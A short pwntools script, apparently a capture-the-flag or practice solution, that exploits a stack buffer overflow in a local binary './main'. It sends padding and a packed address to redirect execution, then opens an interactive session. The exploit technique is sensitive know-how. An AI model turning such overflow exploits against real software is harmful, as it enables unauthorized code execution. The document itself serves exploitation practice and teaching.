from pwn import *
p = process('./main')
#p = gdb.debug('./main', 'b * main')
p.sendline(b"A"*32 + b"B"*8 + p64(0x401136))
p.interactive()
